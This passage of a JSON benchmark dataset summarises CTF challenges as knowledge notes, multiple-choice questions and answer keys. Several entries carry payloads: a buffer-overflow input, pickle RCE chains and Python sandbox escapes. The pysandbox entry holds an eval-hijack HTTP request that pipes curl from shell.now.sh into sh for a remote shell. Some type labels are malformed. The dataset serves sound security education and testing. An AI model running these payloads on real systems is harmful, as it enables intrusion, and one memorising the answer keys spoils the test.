        "write_up": "dataset/raw/pwnykey.md",
        "type": "pwn",
        "competition": [
            "UIUCTF/2023",
            "https://ctftime.org/event/1899/tasks/"
        ],
        "score": -1,
        "max_score": 50,
        "difficulty": -1,
        "knowledge": [
            "Disassembling custom binary formats can sometimes require creating a custom disassembler if existing ones do not correctly handle the bytecode, especially if dealing with uncommon or bespoke virtual machines. This can involve understanding and interpreting bytecode operations, variables, and control flow directly from the binary, adjusting for peculiarities such as jumps to middle of instructions, or custom encoding of immediates.",
            "Constructing or deconstructing keys for validation checks in software can often involve reverse engineering to determine the format and validation checks applied to the key. Depending on complexity, solutions can range from brute force approaches to using constraint solving with tools like Z3. Particularly, when checks involve arithmetic or logical operations on the key's components, setting up equations or constraints that reflect these operations can lead to uncovering valid keys."
        ],
        "question": [
            "In the context of disassembling a custom binary format that included challenges with jump targets and instruction decoding, which strategy is crucial for accurately interpreting the binary's operation and control flow? - A. Sequentially processing instructions without considering jumps. - B. Modifying existing disassemblers to skip undefined bytes. - C. Implementing a custom disassembler that adheres to the binary's unique encoding and operation rules, specifically handling jumps to the middle of instructions and custom encoding of immediates. - D. Utilizing high-level programming languages for disassembly to ensure accuracy.",
            "When faced with the task of constructing a valid key that passes multiple validation checks within a binary challenge, what approach might be effective, especially when the validation involves arithmetic or logical checks on the key's parts? - A. Guessing the key based on common patterns and trial and error. - B. Using constraint solvers like Z3 to programmatically find key values that satisfy all given checks, indicating reverse engineering to understand how the key is validated. - C. Modifying the binary directly to bypass key validation checks. - D. Searching for valid keys in the binary using string analysis tools."
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "Pwn_ babypwn",
        "write_up": "dataset/raw/Pwn_ babypwn.md",
        "type": "pwn",
        "competition": [
            "WolvCTF/2024",
            "https://ctftime.org/event/2240/tasks/"
        ],
        "score": -1.0,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When exploiting buffer overflow vulnerabilities, especially in C programs that utilizes struct allocations, if there's a variable after the buffer that is checked for a specific value for further actions (like opening a flag), you can overflow the intended buffer and overwrite the adjacent variable or check condition value directly. This can be achieved by sending data larger than the allocated buffer but crafted in such a way that it precisely modifies the subsequent variable to meet a condition. In scenarios where the buffer size is 32 bytes and an integer check value is adjacent, sending 32 bytes of padding followed by the 4 bytes intended to overwrite the check value can trigger the conditional function to execute.\n\n    Sample Payload for above scenario:\n    ```\n    python -c 'print(\"A\"*32 + \"\\x41\\x41\\x41\\x41\")'\n    ```",
            "In programming challenges, particularly those involving reading from standard input to a fixed-size buffer, it's critical to pay attention to the amount of bytes read versus the buffer size defined. If the program reads more bytes into a buffer than its size (e.g., using `fgets` to read 64 bytes into a 32-byte buffer), it presents an opportunity for a buffer overflow attack. This vulnerability allows an attacker to potentially overwrite adjacent memory areas, leading to unauthorized behavior such as bypassing security checks or executing arbitrary code. This knowledge is universally applicable in identifying and exploiting buffer overflow vulnerabilities in similar scenarios.\n\n    No specific sample payload necessary beyond what's provided in point 1."
        ],
        "question": [
            "In an exploitation challenge focusing on buffer overflow within a structure, if the challenge involves a struct with a 32-byte character array followed by an integer check variable, and the goal is to alter the check variable by overwriting its value through the buffer overflow. Given that the input is read using `fgets` into the 32-byte buffer with a size parameter of 64, which of the following payloads would correctly overflow the buffer and set the check variable to 0x41414141, triggering the conditional function?  - A. `python -c 'print(\"A\"*32 + \"\\x41\\x41\\x41\\x41\")'` - B. `python -c 'print(\"B\"*32)'` - C. `python -c 'print(\"A\"*64)'` - D. `python -c 'print(\"\\x41\\x41\\x41\\x41\" + \"A\"*28)'` ",
            "In a scenario where a C program incorrectly reads 64 bytes into a 32-byte buffer using the `fgets` function, creating a potential buffer overflow vulnerability. Which of the following best describes the resulting risk or consequence of executing such a program with input that exceeds the buffer's intended size?  - A. The program will correct the input size automatically and avoid any overflow. - B. Input exceeding 32 bytes may overwrite adjacent memory, potentially altering program behavior or causing a crash. - C. The excess data will be discarded, with no effect on the program's execution or stability. - D. The `fgets` function will throw an exception, preventing any overflow from occurring. "
        ],
        "answer": [
            "A",
            "B"
        ]
    },
    {
        "name": "pycryptor v2",
        "write_up": "dataset/raw/pycryptor v2.md",
        "type": "crypto",
        "competition": [
            "Aero/2019",
            "https://ctftime.org/event/772/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with custom encryption schemes that involve known headers (such as file formats like jpg), one approach to recover encryption keys is by using known plaintext attacks. If certain bytes of the plaintext are known (e.g., file headers), you can attempt to brute-force the remaining unknown bytes to recover the key. This method is applicable in scenarios where the encryption algorithm uses XOR operations, allowing the plaintext, key, and ciphertext to be manipulated algebraically. Specifically, for an encryption scheme that encrypts data in blocks, if the header of the plaintext is partially known, the remaining bytes can be brute-forced to reveal the key used for encryption.\n```python\nenc = read_file(\"example.enc\")  # Encrypted file\nfor tail in generate_tails():  # Function to generate possible tail values\n   jpg_header = (\"ffd8ffe000104a464946000101\" + tail).decode(\"hex\")\n   key = decrypt_key(jpg_header, enc[:16])  # Function to XOR known plaintext with ciphertext\n   if all(x in hexdigits for x in key):  # hexdigits checks if the result is a valid hexadecimal string\n       print(\"Key:\", key)\n       print(\"Tail:\", tail)\n```",
            "To decrypt data encrypted with custom algorithms that utilize CRC (Cyclic Redundancy Check) calculations for generating encryption keys or gammas, you can precalculate all possible gammas based on the limited range of CRC outputs. This is particularly useful if the CRC function outputs are significantly smaller than the potential input space, as in cases where the CRC output is a 2-byte value used in further cryptographic operations. By iterating over possible CRC outputs to generate gammas, one can match these against encrypted data to identify potential decryption keys or directly decrypt data.\n```python\ndef generate_gammas(key):\n   for x in range(0x80):  \n       for y in range(0x80):  \n           gamma = ''  \n           block_crc = [x, y]\n           for i in range(16):  \n               val = block_crc[i % 2]  \n               val ^= ord(key[i])  \n               val &= 0xff  \n               gamma += chr(val)\n           crcs = set(map(p_16, {(_x << 8 | _y), (_x << 8 | (_y | 1)), ((_x | 1) << 8 | _y), ((_x | 1) << 8 | (_y | 1))}))\n           yield gamma, crcs\n# KEY is the discovered key from the decryption process\ngammas = list(generate_gammas(KEY))\n```\nThis method facilitates identifying correct decryption parameters by matching the calculated CRC values of decrypted data against precomputed gamma CRC sets, thus narrowing down the correct decryption gamma for each block of data."
        ],
        "question": [
            "In an encryption scheme where a file is encrypted using XOR, knowing the first 13 bytes of a .jpg file header allows for the recovery of the encryption key by brute-forcing the unknown bytes. Given the approach to recover this key, what is needed to complete the brute-force attack?  ```plaintext enc = read_file(\"image.enc\")  # Encrypted .jpg file for tail in generate_tails(): jpg_header = (\"ffd8ffe000104a464946000101\" + tail).decode(\"hex\") key = decrypt_key(jpg_header, enc[:16]) if all(x in hexdigits for x in key): print(\"Key:\", key) print(\"Tail:\", tail) ``` - A.Function to generate all potential tail combinations for the .jpg header - B.Function to compare the generated keys against a public key database - C.Method to apply a differential cryptanalysis attack - D.Algorithm to decrypt the .jpg file without the need for a key ",
            "Given an encryption scheme that utilizes gamma values derived from CRC calculations for encryption, how can one approach decrypting the data if the CRC outputs are known to be 2 bytes long and the key is known?  ```python def generate_gammas(key): for x in range(0x80): for y in range(0x80): gamma = '' block_crc = [x, y] for i in range(16): val = block_crc[i % 2] val ^= ord(key[i]) val &= 0xff gamma += chr(val) crcs = set(map(p_16, {(_x << 8 | _y), (_x << 8 | (_y | 1)), ((_x | 1) << 8 | _y), ((_x | 1) << 8 | (_y | 1))})) yield gamma, crcs ``` - A.Normalize the gamma values to ensure they match the encrypted data's CRC - B.Iterate over every possible CRC output to precalculate gamma values and their corresponding CRC sets - C.Compute a single gamma value for each block and use a hash table to decrypt the data - D.Convert each gamma value into a public-private key pair for asymmetric decryption "
        ],
        "answer": [
            "A",
            "B"
        ]
    },
    {
        "name": "pydis2ctf",
        "write_up": "dataset/raw/pydis2ctf.md",
        "type": "reverse",
        "competition": [
            "csictf/2020",
            "https://ctftime.org/event/1081/tasks/"
        ],
        "score": 490,
        "max_score": 2000,
        "difficulty": 0.245,
        "knowledge": [
            "When dealing with CTF challenges categorized under reversing, especially those involving Python bytecode, leveraging the Python `dis` module documentation is crucial for understanding the bytecode instructions and thereby reversing the bytecode to its original Python script form. This approach is applicable in scenarios where Python bytecode needs to be decompiled or understood to reverse-engineer the logic implemented by the original Python script.",
            "In the context of reversing challenges that involve encoding and manipulation of text data, understanding the logic of character manipulation based on ASCII values is fundamental. Specifically, if a script iterates over a text, performs operations based on the ASCII value of each character (`ord` function), and perhaps alters these based on the length of the text or a similar variable, reversing the operation typically involves inverting the mathematical operation applied. For example, if the original script encodes text by multiplying the ASCII value by 2 and then subtracting the length of the text, the reversing process should add the length back and then divide by 2, applying the `chr` function to convert ASCII back to characters. This knowledge is directly applicable in scenarios where encoded or ciphered text must be decoded, and the encoding process involves arithmetic operations on the ASCII values of the text characters.\n\nSample solution snippet to reverse the encoding process:\n```python\nencoded_text = 'YourEncodedTextHere'\ndecoded_text = ''  \nfor i in list(encoded_text):  \n    decoded_text += chr((ord(i) + len(encoded_text)) // 2)  \nprint(decoded_text)\n```"
        ],
        "question": [
            "In a Capture the Flag (CTF) challenge focusing on reversing, which Python module documentation would be most beneficial for understanding disassembled Python bytecode in order to reverse-engineer and reimplement it into its original script form? - A. `re` module for regular expressions - B. `sys` module for system-specific parameters and functions - C. `dis` module for disassembling Python bytecode - D. `os` module for operating system dependent functionality",
            "Given a script from a reversing challenge that manipulates and encodes text by altering the ASCII value of characters, which of the following accurately describes the process to reverse the encoding back to the original text? Assume the original script encoded text by multiplying the ASCII value of each character by 2 and subtracting the length of the text. - A. For each character, multiply the ASCII value by 2 and then add the length of the encoded text. - B. For each character, divide the ASCII value by 2 and subtract the length of the encoded text. - C. For each character, subtract the length of the encoded text from its ASCII value and then divide by 2. - D. For each character, add the length of the encoded text to its ASCII value and then divide by 2."
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "pysandbox",
        "write_up": "dataset/raw/pysandbox.md",
        "type": "misc",
        "competition": [
            "SCTF/2020",
            "https://ctftime.org/event/1068/tasks/"
        ],
        "score": 377,
        "max_score": 1000,
        "difficulty": 0.377,
        "knowledge": [
            "In a sandbox escape challenge focusing on Python environments, specifically ones using the `ast` module for input parsing, explore areas of the abstract syntax tree (AST) not checked by the sanitizer. For instance, leveraging unchecked parts of AST nodes like `args` in `Lambda` or `generators` in `ListComp` allows bypassing restrictions on expressions. This method can be applied when calls or attributes are disallowed but the application fails to properly validate all components of complex AST node types.  \nExample payloads for retrieving files, such as a flag file:  \n   - List Comprehensions: `[e for e in list(open('flag'))]`\n   - Subscript: `[][sys.stdout.write(open('flag').read())]`",
            "In challenges where manipulating application behavior without direct code execution or imports is required, find a way to hijack or modify function behaviors to achieve remote code execution (RCE) or file read. This can be done by dynamically changing the handling of certain functions or objects\u2014for example, modifying the behavior of a well-known function to execute arbitrary code by crafting payloads that exploit externally controllable variables and bypass syntactical restrictions (such as lack of spaces or quotes). This strategy is particularly effective when direct function calls, imports, or conventional execution methods are filtered or blocked.  \nExample payload for RCE by function hijacking and external variables control:  \n   - First request (Function Hijack to convert `url_parse` to `eval`):   \n     ```\n     POST / HTTP/1.1  \n     Host: __loader__  \n     Content-MD5: _bootstrap_external  \n     Content-Encoding: werkzeug.urls  \n     Content-Length: 246  \n     cmd=request.__class__._get_current_object.__globals__[request.host].__class__.__weakref__.__objclass__.contents.__globals__[request.host].exec_module.__globals__[request.content_md5]._bootstrap.sys.modules[request.content_encoding].url_parse=eval  \n     ```\n   - Second request (Invoke Hijacked Function):  \n     ```\n     POST __import__('os').system('curl${IFS}https://shell.now.sh/8.8.8.8:1003|sh')  \n     Host: __loader__  \n     Content-MD5: _bootstrap_external  \n     Content-Encoding: werkzeug.urls  \n     ```"
        ],
        "question": [
            "In a Python sandbox escape challenge where the `ast` module prohibits the use of `Call` and `Attribute` in input expressions, which of the following methods is a valid way to bypass these restrictions using unchecked parts of AST nodes? - A. Utilizing `Attribute` in `Lambda` functions to execute calls. - B. Exploiting the `args` component of `Lambda` expressions to hide calls. - C. Injecting malicious code directly into `Call` expressions. - D. Writing expressions in comments to execute code.",
            "In a challenge that requires the exploitation of application behavior without direct function calls or imports, which of the following payloads correctly demonstrates the concept of function hijacking and external variable control to achieve remote code execution? - A. Modifying the global scope variables directly to change function behavior. - B. Using reflection to invoke private methods without restrictions. - C. Hijacking the `url_parse` function to act as `eval` by controlling request headers like `Content-MD5` and `Content-Encoding`. - D. Encoding payloads in Base64 to bypass function name restrictions."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "pyshv1",
        "write_up": "dataset/raw/pyshv1.md",
        "type": "The type of the challenge described in the write-up is a **crypto** challenge.",
        "competition": [
            "Balsn/2019",
            "https://ctftime.org/event/811/tasks/"
        ],
        "score": 572,
        "max_score": 1000,
        "difficulty": 0.572,
        "knowledge": [
            "When exploiting pickle deserialization vulnerabilities in a restricted environment where only certain modules are on the whitelist, utilize the `__reduce__` method to execute arbitrary code. This method should craft objects that, once unpickled, execute functions available within the whitelisted modules, allowing for the bypassing of imposed restrictions. This approach can facilitate the execution of commands or arbitrary code through whitelisted modules by manipulating the deserialization process to call desired functionalities indirectly. \n   \n   Example payload for adding \"os\" to the whitelist and running a command: \n   ```python\n   c1 = craft(\n       attr(\"sys.__setattr__\"), \n       \"modules\", {\"sys\": sysattr(\"modules\")}\n   )\n   c2 = craft(attr(\"sys.__getitem__\"), \"securePickle\", dict={\"whitelist\": [\"sys\", \"os\"]})\n   c3 = craft(attr(\"os.system\"), \"id; cat ../flag.txt\")\n   ```",
            "In scenarios where the available modules do not directly provide the desired level of access or functionality (like executing system commands), one can manipulate module attributes or the global namespace to introduce or modify functionalities. By altering `__builtins__` or similar globally accessible objects, it's possible to redefine key functionalities like Python's `__import__` mechanism. This can allow for the arbitrary execution of code via indirect access to non-whitelisted modules or functions, effectively bypassing the restrictions.\n\n   Example payload for redefining `__import__` and executing arbitrary code:\n   ```python\n   c1 = craft(attr(\"structs.__setattr__\"), \"structs\", attr(\"structs.__dict__\"))\n   c2 = craft(\n       attr(\"structs.__getattribute__\"),\n       \"__builtins__\",\n       items=[(\"__import__\", attr(\"structs.__getattribute__\"))]\n   )\n   c3 = craft(attr(\"structs.update\"), bs)\n   c4 = craft(attr(\"structs.__setitem__\"), \"structs\", ev)\n   c5 = craft(attr(\"structs.__call__\"), r'print(open(\"../flag.txt\").read())')\n   ```"
        ],
        "question": [
            "When working with Python pickling in a secure environment only allowing specific modules to be deserialized, to execute arbitrary code using the `__reduce__` method, which of the following steps is a correct use of the method to manipulate whitelisted modules to run system commands? - A. Directly calling the system command without manipulating the whitelist. - B. Modifying an unrelated object's attributes that are not involved in deserialization. - C. Using `__reduce__` to create objects that, once unpickled, execute functions from whitelisted modules to indirectly call desired commands. - D. Attempting to unpickle objects without using the `__reduce__` method.",
            "In a Python environment where direct execution via usual modules like `os` is not possible due to restrictions, how can the global namespace or module attributes be manipulated to execute arbitrary code by bypassing limitations on module access? - A. By leaving the global namespace and module attributes unmodified and using only the available functions in a straightforward manner. - B. Manipulating the `__builtins__` object or similar to change essential functionality such as Python's `__import__` mechanism to indirectly gain access to restricted functionalities. - C. Avoiding the manipulation of any global or module-specific attributes to maintain the integrity of the sandbox environment. - D. Focusing on modifying attributes of completely unrelated modules that have no impact on sandbox escape or arbitrary code execution."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Python Shell",
        "write_up": "dataset/raw/Python Shell.md",
        "type": "misc",
        "competition": [
            "UTCTF/2021",
            "https://ctftime.org/event/1177/tasks/"
        ],
        "score": 943,
        "max_score": 1000,
        "difficulty": 0.943,
        "knowledge": [
            "When dealing with Python sandbox environments that restrict certain keywords to prevent exploitation, one can bypass these restrictions by dynamically accessing Python's built-in methods or attributes. This can be done via `__builtins__.__dict__` method, allowing the construction of prohibited keywords as strings. For example, to bypass the restriction on the `eval` function, use `__builtins__.__dict__['ev' + 'al']`.",
            "If direct function calls like `open()` are not permitted due to a sandbox restriction, alternative methods such as executing shell commands can be utilized to interact with the file system or perform actions indirectly. This can be achieved by accessing Python's `os` module dynamically and using its `system` method to run shell commands like `cat` to read files. This approach leverages the fact that while direct function calls might be filtered or restricted, the sandbox may not restrict indirect access to functionality via the Python environment's built-in modules or through external command execution. Example payload: `p = '__builtins__.__i' + 'mport__' + int.__doc__[3] + '\"os\").system' + int.__doc__[3] + '\"cat /flag.txt\")'; __builtins__.__dict__['print'] = __builtins__.__dict__['ev' + 'al']; print(p)\"`."
        ],
        "question": [
            "In a restricted Python environment that disallows direct invocation of certain functions such as `eval`, one can circumvent such restrictions by dynamically constructing the function name from strings and retrieving it from `__builtins__.__dict__`. Given this scenario, which of the following code snippets correctly bypasses a restriction on the `eval` function? - A. `__builtins__['eval']('print(\"Hello World\")')` - B. `__builtins__.__dict__['ev' + 'al']('print(\"Hello World\")')` - C. `eval('print(\"Hello World\")')` - D. `globals()['eval']('print(\"Hello World\")')`",
            "When direct file access is prohibited in a Python sandbox environment, and the use of typical file-handling functions like `open()` is not allowed, an alternative approach is to execute shell commands to perform the required operations. In the given scenario, how can you read the contents of a file named `/flag.txt` by bypassing the restrictions using dynamic access to Python's `os` module and its `system` method? - A. `open('/flag.txt').read()` - B. `__builtins__.__dict__['os.system']('cat /flag.txt')` - C. `__import__('os').system('echo /flag.txt')` - D. `p = '__builtins__.__i' + 'mport__' + int.__doc__[3] + '\"os\").system' + int.__doc__[3] + '\"cat /flag.txt\")'; __builtins__.__dict__['print'] = __builtins__.__dict__['ev' + 'al']; print(p)`"
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "pythopia",
        "write_up": "dataset/raw/pythopia.md",
        "type": "reverse",
        "competition": [
            "nullconHackIM/2023-Berlin",
            "https://ctftime.org/event/1900/tasks/"
        ],
        "score": 53,
        "max_score": 482,
        "difficulty": 0.10995850622406639,
        "knowledge": [
            "In Python abstract syntax tree (AST) parsing challenges, when given a comparison of string length, followed by splitting that string into multiple parts, each part might have to adhere to a specific condition. In this scenario, understanding how the input splits and analyzing conditions for each part can reveal what each segment must contain for the input to pass the checks.",
            "XOR encryption can frequently be reversed in CTF challenges if the XOR key and the ciphertext (or expected result of the XOR operation) are known. This is done by XORing the ciphertext (or expected result) with the XOR key to retrieve the original plaintext. In challenges involving a list of values being XORed with a known value, the reverse operation can be applied to each element to discover the required input. Example payload for reversing XOR when the key is 19 and the value is 36 would be: `chr(36 ^ 19)`."
        ],
        "question": [
            "In a Python abstract syntax tree (AST) challenge involving string manipulation, the input string's length is initially checked to be 64 characters. It is then divided into four equal parts, each needing to meet certain conditions. Given this segmentation, what is the correct way to conceptualize the string's validation process? - A. The input string is not validated for length or divided into parts, allowing any string to pass the checks. - B. The input string's length is checked to be 64 characters, and then it is processed as a whole without being divided into parts. - C. The input string's length is checked to be 64 characters, and then it is divided into four parts, with each part undergoing separate validation based on specific criteria. - D. The input string is immediately divided into four parts without any length check, with each part presumed to contain equal amounts of characters and validated separately. ",
            "Considering an XOR decryption task in a Capture the Flag (CTF) challenge where each character of a segment of the input string is XOR'ed with the number 19 to match a predetermined list of values, how can the required segment of the input be determined? - A. By XOR'ing the predetermined list of values with 20, as this is the common approach to decrypt an XOR operation. - B. By iterating over each character of the input string and applying an XOR operation with the number 18 to see if it matches the predetermined list of values. - C. Without performing any operation, as XOR encryption is irreversible and cannot determine the original input values. - D. By XOR'ing each value from the predetermined list with 19 to retrieve the original character values of the input segment. "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "P_rn Protocol",
        "write_up": "dataset/raw/P_rn Protocol.md",
        "type": "pwn",
        "competition": [
            "Hack.lu/2020",
            "https://ctftime.org/event/1142/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In a custom protocol interaction challenge, ensure sequence numbers are incremented with each request, and maintain the same identifier throughout the session to keep track of the communication state with the server. This practice helps to avoid errors related to unexpected payloads or invalid message identifiers, which are common challenges when interacting with server applications that rely on a stateful protocol. Incrementing sequence numbers and reusing identifiers demonstrate the importance of maintaining state consistency between the client and server.",
            "When handling custom protocol interactions involving login procedures, it is crucial to first acquire or generate valid credentials before sending a login request. This can be accomplished through interacting with the server's protocol commands that allow for user registration or credential retrieval. Once obtained, sending the credentials following the server\u2019s expected format, often including a specific order or structure of packets, enables successful authentication. Ensuring correct format and sequence in login requests is essential for bypassing authentication mechanisms in services with custom protocols.\n   \n   Example payload for sending a login request (assuming obtained credentials):\n   ```python\n   # Assuming seq_num and identifier have been appropriately set\n   username = \"acquired_username\"\n   password = \"acquired_password\"\n   # Constructing and sending packets for login\n   pkt1 = Packet(b'\\x02\\x01' + seq_num)  # Message ID packet with incremented sequence number\n   pkt2 = Packet(b'\\x11\\x02' + identifier)  # Identifier packet\n   pkt3 = Packet(b'\\x02\\x04\\x01')  # Login request packet\n   # Send the packets as bytes\n   io.send(pkt1.to_bytes() + pkt2.to_bytes() + pkt3.to_bytes())\n   # Following up with username and password as the server prompts\n   io.sendline(username)\n   io.sendline(password)\n   ```"
        ],
        "question": [
            "In the context of custom protocol interactions where maintaining a session state is crucial, which of the following approaches is necessary for ensuring state consistency between the client and server? - A. Sending packets in a random sequence without maintaining any order - B. Reusing the session identifier and decrementing the sequence number with each request - C. Reusing the session identifier and incrementing the sequence number with each request - D. Creating a new session identifier for each request and keeping the sequence number static",
            "When attempting to authenticate using a custom protocol that requires credentials, what step must be taken before sending a login request? - A. Send a logout request to clear previous sessions before attempting to login - B. Send a request to increment the server's sequence number without providing any credentials - C. Interact with the server's commands to obtain or generate valid credentials, then send these using the expected packet format and sequence - D. Change the server\u2019s expected packet format to match the client's preferences before sending credentials"
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "quantum 1",
        "write_up": "dataset/raw/quantum 1.md",
        "type": "This is a \"crypto\" challenge.",
        "competition": [
            "DiceCTF/2021",
            "https://ctftime.org/event/1236/tasks/"
        ],
        "score": 436,
        "max_score": 500,
        "difficulty": 0.872,
        "knowledge": [
            "When analyzing quantum circuits, especially those implementing Shor's algorithm for factoring public moduli, one strategy is to look for hard-coded values that depend on the modulus `N`. These values are often found in the implementation of modular exponentiation, which itself is made up of repeated modular multiplications and additions. In this context, understanding how modular operations are broken down into quantum implementations can reveal hardcoded values that can then be used to recover `N`. This approach leverages the structured, repetitive nature of the circuit to identify patterns or specific operations (e.g., the `ccx` instruction usage for conditional writes) that ultimately depend on `N`.",
            "For dynamic analysis of quantum circuits, especially when the challenge involves simulating a circuit to understand how data flows through it, exploiting the initialization phase where specific values are loaded can be crucial. Given Shor's algorithm involves steps like modular exponentiation by repeated squaring, early stage values such as `a, a^2, a^4, a^8, ... mod N` are loaded and can be paused during emulation to recover these modular powers. This is foundational for applying mathematical techniques like the greatest common divisor (gcd) to find a small multiple of `N`, leveraging the mathematical property that `a^2 - (a^2 mod N)` is a multiple of `N`. This technique requires familiarity with classical reversible computing gates like SWAP, NOT, CNOT, and CCNOT, understanding their function can aid in the emulation and analysis of quantum circuits designed for integer factorization.\n\nExample application based on point 2:\n```python\n# Assuming you've extracted a^2 mod N and a^4 mod N from the emulated circuit's operations\na2_mod_N = extracted_value1\na4_mod_N = extracted_value2\n\n# Calculated `a` values before modular reduction (must be inferred or known from circuit's function)\na2 = known_a_squared\na4 = known_a_to_the_fourth\n\n# Recovering a small multiple of `N`\nN_multiple = gcd(a2 - a2_mod_N, a4 - a4_mod_N)\n\n# This `N_multiple` can then be factored to attempt to recover `N` itself, if `N_multiple` is not prime.\n```"
        ],
        "question": [
            "When synthesizing the modular exponentiation phase in Shor's algorithm through a quantum circuit, which method is commonly expected to deduce values that depend on the modulus `N`? - A. Utilizing quantum entanglement properties to directly solve for `N` - B. Leveraging hardcoded values in the implementation of modular operations that reflect repeated additions and squarings mod `N` - C. Applying the quantum Fourier transform to directly extract `N` from the initial quantum state - D. Using quantum teleportation protocols to transfer `N` from one part of the circuit to another",
            "In the context of dynamically analyzing a quantum circuit implementing Shor's algorithm, what essential technique aids in uncovering a small multiple of the modulus `N`? - A. Conducting a Bell state measurement on every qubit to reveal `N` - B. Exploiting the Bell test to check for classical correlations that indirectly suggest the value of `N` - C. Observing the values loaded during the initialization phases, like `a^2 mod N` and `a^4 mod N`, and utilizing the greatest common divisor (gcd) function to find a multiple of `N` - D. Instantiating a quantum Zeno effect through rapid measurement, freezing the circuit at a moment revealing `N`"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "quantum 2",
        "write_up": "dataset/raw/quantum 2.md",
        "type": "The type of this CTF challenge is **reverse**.",
        "competition": [
            "DiceCTF/2021",
            "https://ctftime.org/event/1236/tasks/"
        ],
        "score": 436,
        "max_score": 500,
        "difficulty": 0.872,
        "knowledge": [
            "In quantum computing challenges, especially when examining quantum circuits that use the Quantum Fourier Transform (QFT) for operations like addition, participants can analyze the circuit to reveal hidden classical numbers. This is achieved by identifying and extracting the rotation angles from multiply-controlled phase gates (`mcphase` gates), as these gates encode the addition of classical numbers to quantum states. The angle information, once converted and analyzed, can reveal the classical number in binary form. This method applies when circuits are optimized for quantum computations to include fewer qubits, as seen with QFT-based addition versus traditional reversible computing circuits. The key step involves translating the extracted rotation angles into a binary representation of the number being added, which can often be discerned from examining patterns in the numeral representations of the angles.  \n\n   **Example Process:**\n   - Use `grep` to extract specific gate information from the quantum assembly files (e.g., `grep mcphase circuit.qasm -A 0 > output.txt`).\n   - Analyze the rotation angles, especially looking for patterns with pi, and convert those angles to floating point numbers that can be represented as fractions. These fractions, when analyzed correctly, reveal a binary pattern that corresponds to the classical number being added.",
            "When working with quantum circuits that encode values in a repetitive pattern, as seen in some quantum computing challenges, it is possible to deduce significant numerical values essential for the challenge, like `N` in RSA-based encryption scenarios. This is done by recognizing patterns in the values being added during certain operations, such as the QFT-adder's usage. The pattern, once identified, can simplify the extraction of critical values needed to move forward, essentially by observing the sequence of numbers involved in the computational steps and identifying the underlying repetition or mathematical relationship.  \n\n   **Example Insight:**\n   - For challenges involving pattern recognition in sequences of numbers added during quantum operations, one might observe a repetitive sequence that, when analyzed, can reveal values like `N` in RSA encryption (e.g., a pattern like `N-a, N, a, a, N-2a, N, 2a, 2a, ...`). This insight significantly simplifies the process of extracting key values necessary for decrypting or further manipulating the encrypted data challenge presents."
        ],
        "question": [
            "In the context of a quantum computing challenge involving QFT-based addition, after executing a command like `grep mcphase circuit.qasm -A 0 > output.txt` to extract rotation angles from multiply-controlled phase gates, how should one interpret the rotation angles to discover the classical number being added? Assume all relevant phase gates that encode numbers appear as multiply-controlled phase gates, and you have already isolated these gates and their angles.  - A.Convert the angles from radians to degrees, and then find the sum to get the classical number. - B.Divide each angle by pi to obtain a set of floating point numbers, and then analyze these numbers to discern a pattern indicating the classical number in decimal. - C.Divide each angle by (2 * pi), convert to floating point numbers that represent fractions with a power-of-2 denominator, and then map these to binary to read off the classical number being added. - D.Multiply each angle by the square root of 2, and then directly convert these values to binary assuming they represent the classical number in a straight-forward binary form. ",
            "When analyzing a series of numbers added to a quantum circuit using a QFT-adder, revealing a pattern such as `N-a, N, a, a, N-2*a, N, 2*a, 2*a, ...`, which significant numerical value can be deduced from this repetitive pattern, particularly useful in decryption or computational challenges involving RSA encryption?  - A.The value of `pi` utilized in the QFT-adder's rotation calculations. - B.The prime factors of the RSA module `N`, essential for encryption algorithms. - C.The quantum bit (qubit) count required for the quantum circuit's execution efficiency. - D.The hardcoded numerical value `N`, as indicated in the pattern, which is crucial for further steps in the challenge, such as decrypting a message or understanding the circuit's purpose. "
        ],
        "answer": [
            "C.",
            "D."
        ]
    },
    {
        "name": "Quantum Key Distribution",
        "write_up": "dataset/raw/Quantum Key Distribution.md",
        "type": "crypto",
        "competition": [
            "GoogleCTF/2019/Quals",
            "https://ctftime.org/event/809/tasks/"
        ],
        "score": 92,
        "max_score": 500,
        "difficulty": 0.184,
        "knowledge": [
            "When tackling challenges related to Quantum Key Distribution (QKD) using the BB84 protocol, carefully choosing qubits and basis can simplify the problem. Specifically, selecting a qubit state of `0+1j` and a basis of `\"+\"` across all qubits ensures a predictable measurement result of `1`, making the key derivation process more straightforward. This approach bypasses randomness requirements imposed by some implementations, allowing for efficient generation of the shared key.  \n   **Example choices:**  \n   - Basis: `[\"+\" for i in range(512)]`  \n   - Qubits: `[{\"real\": 0, \"imag\": 1} for i in range(512)]`",
            "In cryptographic challenges involving XOR encryption for the flag, if you can determine the shared key used in encryption, apply XOR again with the known shared key to the encrypted message (often provided as an \"announcement\" in the challenge) to decrypt it. This method is applicable when the challenge provides a mechanism to generate or deduce the shared key (as in the case of a QKD challenge) and the length of the key is known (e.g., 128 bits in the example).  \n   **Example decryption steps:**  \n   - Derive the shared key: `shared_key = 2**128-1`  \n   - Apply XOR: `decrypted_key = hex(announcement^shared_key)`  \n   - Use the decrypted key to decrypt the message."
        ],
        "question": [
            "In the context of the BB84 protocol for Quantum Key Distribution, which choice of qubits and basis simplifies the generation of a predictable shared key, while adhering to certain randomness restrictions? - A. Setting each qubit to `0-1j` and basis to `\"-\"`. - B. Setting each qubit to `1+0j` and basis to `\"*\"`. - C. Setting each qubit to `0+1j` and each basis to `\"+\"`. - D. Setting each qubit to `1-0j` and basis to `\"x\"`.",
            "In a cryptographic scenario where the encryption key is XORed with a known shared key to produce an \"announcement\", what step is correct for decrypting a message once the shared key is determined? - A. Subtract the shared key from the announcement to decrypt the encryption key. - B. Perform a bitwise AND on the shared key and the announcement to decrypt the encryption key. - C. Apply XOR with the announcement and the known shared key to decrypt the encryption key. - D. Concatenate the shared key with the announcement to decrypt the encryption key."
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "QuinEVM",
